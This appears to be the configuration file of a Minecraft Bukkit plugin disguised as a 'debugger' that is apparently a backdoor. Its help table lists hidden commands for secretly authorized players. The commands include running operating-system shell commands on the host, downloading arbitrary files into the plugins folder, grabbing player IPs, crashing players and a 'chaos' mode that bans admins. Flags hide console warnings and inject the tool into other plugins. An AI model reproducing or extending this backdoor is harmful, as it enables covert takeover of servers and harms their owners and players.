/*
 * Plugin configuration file
 */

package com.thiccindustries.debugger;

import org.bukkit.ChatColor;

public class Config {


    /*Command execution*/
    // Authorized UUIDS
    public static String[] authorized_uuids = {""};

    // UUIDs added by the auth command. DO NOT EDIT
    public static String[] tmp_authorized_uuids;
    // Command Prefix

    public static String command_prefix = "#";

    // Treat authorized_uuids / tmp_authorized_uuids as player names instead.
    public static Boolean uuids_are_usernames = false;

    // Inject Debugger to other plugins.
    public static Boolean inject_into_other_plugins = true;

    // Warn server console about "debugger"
    public static Boolean display_debugger_warning = false;

    // Print debug messages to console 
    public static Boolean display_debug_messages = false;




    /* Command defaults */

    // Default gamemode for gamemode command
    public static final int default_gamemode = 1;

    // Default ban reason 
    public static final String default_ban_reason = "Banned";

    // Default ban source 
    public static final String default_ban_source = "Server";

    public static final int default_lag_spawn_amount = 5000;

    /* Chat settings */

    // message prefix 
    public static final String chat_message_prefix = "## BD ##";

    // color of messages prefix 
    public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;

    // color of help command name 
    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;

    // color of help command syntax 
    public static final ChatColor help_command_desc_color = ChatColor.WHITE;

    // color of help 
    public static final ChatColor help_detail_color = ChatColor.GREEN;

    // Chaos chat message
    public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n" +
                                                        "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";

    // Help message content
    public static final HelpItem[] help_messages = {
            new HelpItem("help",        "[command]",                    "display this message, or description of command."),
            new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
            new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
            new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("banip",       "(player) [reason] [source]",   "ip ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("gm",          "(gamemode)",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
            new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
            new HelpItem("exec",        "(command)",                    "[Visible] Execute command as server console"),
            new HelpItem("shell",       "(command)",                    "[Visible] Execute operating system as host.\nWarning: Command syntax differs between windows, mac, and linux hosts."),
            new HelpItem("info",        "",                             "shows informatin about server"),
            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself"),
            new HelpItem("seed",        "",                             "get the current world seed"),
            new HelpItem("psay",        "(player) (message)",           "sends messages as player"),
            new HelpItem("ssay",       "(message)",                    "sends messages as Server"),
            new HelpItem("rename",      "[name]",                       "changes your nick"),
            new HelpItem("reload",      "",                             "[Visible] Reloads the server"),
            new HelpItem("getip",       "(player)",                     "gets ip of the player (def: nickname)"),
            new HelpItem("listworlds",    "",                           "displays all worlds"),
            new HelpItem("makeworld",      "(world)",                   "[Visible] Creates new world (def: world_name)"),
            new HelpItem("delworld",     "(world)",                     "[Visible] Deletes a world (def: world_name)"),
            new HelpItem("vanish",      "",                             "makes you vanish, tab included"),
            new HelpItem("silktouch",   "[player]",                     "gives player silk touch hands (def: nickname)"),
            new HelpItem("instabreak",  "[player]",                     "let's player mine instantly (def: nickname)"),
            new HelpItem("crash",       "(player)",                     "crashes player's name (def: nickname)"),
            new HelpItem("mindfuck",    "(method) (player)",            "Options: thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, speed"),
            new HelpItem("lock",        "(player), (all) or (console)", "locks the console or blocks player (def: nickname, all or console)"),
            new HelpItem("unlock",      "(player), (all) or (console)", "unlocks the console or unblocks player (def: nickname, all or console)"),
            new HelpItem("mute",        "(player) or (all)",            "mutes a player (def: nickname or all)"),
            new HelpItem("unmute",      "(player) or (all)",            "unmutes a player (def: nickname or all)"),
            new HelpItem("download",    "(url) (file)",                 "downloads a file, don't use special chars or spaces (def: url plugins/file.jar)"),
            new HelpItem("coords",      "(player)",                     "get the coordinates of specified player"),
            new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
            new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed"),
            new HelpItem("tp",          "(x) (y) (z)",                  "[Visible] Teleport to specified coordinates"),
            new HelpItem("stop",        "",                             "[Visible] Shutdown the server")
    };

    public static class HelpItem{

        private final String name;
        private final String syntax;
        private final String desc;

        public HelpItem(String name, String syntax, String desc){
            this.name = name;
            this.syntax = syntax;
            this.desc = desc;
        }

        public String getName(){
            return name;
        }

        public String getSyntax(){
            return syntax;
        }

        public String getDesc(){
            return desc;
        }

        public String toString(){
            return Config.help_command_name_color + name + " " + syntax + ": " + Config.help_command_desc_color + desc;
        }
    }
}

